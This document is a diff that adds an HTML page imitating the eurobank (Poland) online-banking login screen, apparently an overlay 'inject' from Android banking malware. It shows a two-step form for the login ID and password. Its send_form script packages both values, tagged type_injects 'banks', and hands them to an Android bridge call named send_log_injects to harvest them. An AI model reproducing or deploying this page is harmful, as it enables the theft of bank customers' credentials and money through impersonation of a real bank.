@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>eurobank</title>
+    <link rel="shortcut icon" href="pl.eurobank2.png" type="image/png">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="utf-8">
+</head>
+<body>
+
+<style type="text/css">
+    body {
+        background: #fff;
+        margin: 0;
+        padding: 0;
+        font-family: Helvetica, sans-serif;
+        background-size: 100%;
+    }
+    .logo {
+text-align: right;
+    background-size: 100%;
+    padding: 0px 0px 0px 0px;
+    color: #fff;
+    font-weight: 400;
+    text-decoration: none;
+    }
+    .form {
+        text-align: center;
+        padding-top: 70px;
+    }
+    .form label {
+        display: block;
+    }
+    form {
+        display: inline-block;
+    }
+fieldset {
+      position: relative;
+      text-align: center;
+      border: none;
+          margin: 0;
+    padding: 0;
+
+}
+
+input[type="text"],input[type="password"] {
+    line-height: 16px;
+    font-size: 17px;
+    box-sizing: border-box;
+    width: 100%;
+    position: relative;
+    padding: 10px;
+    margin: 0px 1px;
+    display: block;
+    -webkit-box-shadow: none;
+    box-shadow: none;
+    -webkit-appearance: none;
+    height: 48px;
+    margin: 0px 0px 0px 0px;
+    color: #151515;
+    outline: none;
+    border: 1px solid #e3e1e1;
+    background: #fff;
+    text-align: left;
+    border-top: none;
+    border-left: none;
+    border-right: none;
+}
+input[type="button"] {
+left: 0;
+    right: 0;
+    width: 100%;
+    height: 47px;
+    margin: 30px 0px 0px 0px;
+    outline: none;
+    float: right;
+    color: #fff;
+    border: none;
+    font-size: 17px;
+    -webkit-appearance: none;
+    cursor: pointer;
+    background: #727172;
+}
+fieldset span {
+    display: inline-block;
+    text-align: center;
+    color: #4b4949;
+    left: 0;
+    right: 0;
+    padding-top: 30px;
+}
+fieldset p {
+    display: inline-block;
+    left: 0;
+    right: 0;
+    color: #088f0d;
+}
+.logo span {
+    display: inline-block;
+    float: left;
+    padding: 40px 0px 0px 20px;
+    font-size: 20px;
+    color: #fff;
+    font-weight: 600;
+}
+input::placeholder {
+    color: #a1a1a1;
+    font-size: 15px;
+}
+.pass input::placeholder {
+    font-size: 11px;
+    color: #db2060;
+}
+</style>
+
+<script type="text/javascript">
+    function next() {
+        if (document.getElementById("login").value == '')
+{
+    alert ('Wszystkie pola wymagane!');
+    return false;
+}
+        document.getElementById("log1").style.display="none";
+        document.getElementById("pw").style.display="block";
+        document.getElementById('inputlogin').innerText = document.getElementById('login').value;
+    }
+function testJump(x){
+    var ml = ~~x.getAttribute('maxlength');
+    if(ml && x.value.length >= ml){
+        do {
+      x = x.nextSibling;
+    }
+    while (x && !((/text/.test(x.type)) || x.disabled));
+        if(x && /text/.test(x.type)){
+            x.focus();
+        }
+    }
+}
+</script>
+
+<fieldset id="formtosend">
+
+<div class="" id="log" style="display: block;">
+
+<div class="logo">
+<div style="text-align: center; color: #000;">
+<img src="data:image/png;base64,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" style="width: 200px;">
+</div>
+</div>
+
+
+<div id="log1">
+
+<div class="area" style="padding: 20px 20px 50px 20px;border-radius: 3px;margin-top: 40px;">
+<label style="color: #acacac; font-size: 13px; float: left; padding: 0px 0px 0px 10px;">Identyfikator bankowości elektronicznej lub alias</label>
+        <input type="text" name="login" id="login" style="height: 70px;" placeholder="Podaj identyfikator lub alias">
+        <input type="button" name="sumbit" value="Dalej" onclick="next()">
+</div>
+
+</div>
+        <div id="pw" style="display: none; margin-top: 20px; padding: 20px 20px 50px 20px;">
+
+<label style="color: #acacac; font-size: 13px; padding: 0px 0px 0px 10px; text-align: center;">Hasło do logowania w serwisie eurobank online</label>
+        <input type="password" name="password" id="password" style="height: 70px;text-align: center;" placeholder="Podaj hasło">
+
+
+<input type="button" name="sumbit" value="Dalej" onclick="send_form()">
+
+</div>
+        </div>
+        <input name="exit" type="hidden" text="true"/>
+</div>
+
+</div>
+
+</fieldset> 
+
+<script>
+function send_form()
+{
+
+        if (document.getElementById("password").value == '')
+{
+    alert ('Wszystkie pola wymagane!');
+    return false;
+}
+var data = {};
+    data.login = document.getElementById('login').value;
+    data.password = document.getElementById('password').value;
+    data.type_injects = "banks";
+    data.closed = "close_activity_injects";
+    
+    var ua = navigator.userAgent.toLowerCase();
+    if(ua.indexOf("android") > -1) {
+        try {
+            Android.send_log_injects(JSON.stringify(data))
+        } catch (err) {}
+    }else{
+        alert(JSON.stringify(data));
+    } 
+}
+</script>
+
+</body>
+</html>
